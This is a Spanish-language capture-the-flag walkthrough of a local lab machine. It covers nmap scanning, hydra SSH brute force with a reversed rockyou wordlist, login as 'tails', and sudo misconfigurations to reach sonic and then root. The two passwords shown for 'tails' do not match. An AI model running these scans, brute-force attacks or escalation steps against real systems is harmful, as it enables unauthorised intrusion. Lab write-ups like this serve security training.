Primero realizo un envió de ping a la maquina victima para comprobar si esta activa
```
ping -c 1 172.17.0.2
```

## Escaneo
Una vez que se que la maquina esta activa realizo un escaneo en busca de puertos abiertos
```
nmap -p- --open --min-rate 5000 -sS -n -Pn 172.17.0.2 -oG escaneo
```
Al realizar el escaneo encuentro que los puertos **22,80**. Realizo un escaneo para buscar versiones y scripts.
```
nmap -p22,80 -sCV 172.17.0.2 -oN puertos
```

Al no encontrar vulnerabilidades en las versiones, realizo una búsqueda en la pagina web.
Lo lo único que encuentro es una palabra "**tails**", realizo búsqueda de directorios y no encuentro nada, asi que voy a utilizar tails como posible usuario para realizar fuerza bruta.

## Explotación 
Utilizo hydra para poder realizar fuerza bruta en busca de posibles contraseñas.
```
hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
La contraseña encontrada se encuentra casi al final del diccionario rockyou.txt.
Para optimizar el tiempo del ataque, se invierte el diccionario utilizando tac,
de forma que Hydra pruebe primero las contraseñas que normalmente estarían al final.
```
tac /usr/share/wordlists/rockyou.txt | tr -d ' ' > /tmp/rockyou_reverse.txt
```
Una vez creado el diccionario invertido realizo la busqueda
```
hydra -l tails -P /tmp/rockyou_reverse.txt ssh://172.17.0.2
```
Encuentro la contraseña mas rápido para el usuario **tails**
```
[22][ssh] host: 172.17.0.2 login: tails password: 3117548331
```

Ya con el usuario y contraseña puedo ingresar a través de ssh
```
ssh tails@172.17.0.2
pass: 311754831

tails@fe93020431da:~$ id uid=1002(tails) gid=1002(tails) groups=1002(tails)
```

## Escalada de privilegios
Una vez dentro de la maquina resta escalar privilegios para llegar a ser usuario root.
Realizo búsqueda de permisos SUDO.
```
tails@fe93020431da:~$ sudo -l User tails may run the following commands on fe93020431da: (sonic) NOPASSWD: ALL
```
 Esto me dice que el usuario **tails** puede utilizar cualquier comando como el usuario **sonic** sin contraseña.
```
tails@fe93020431da:~$ sudo -u sonic /bin/bash sonic@fe93020431da:/home/tails$ id uid=1001(sonic) gid=1001(sonic) groups=1001(sonic),27(sudo)
```
Ahora como el usuario sonic realizo búsqueda de permisos SUDO
```
sonic@fe93020431da:/home/tails$ sudo -l 
User sonic may run the following commands on fe93020431da: (ALL) NOPASSWD: ALL
```
Esto quiere decir que el usuario **sonic** puede ejecutar cualquier comando de cualquier usuario incluido root
```
sudo /bin/bash
root@fe93020431da:/home/tails# id uid=0(root) gid=0(root) groups=0(root)
```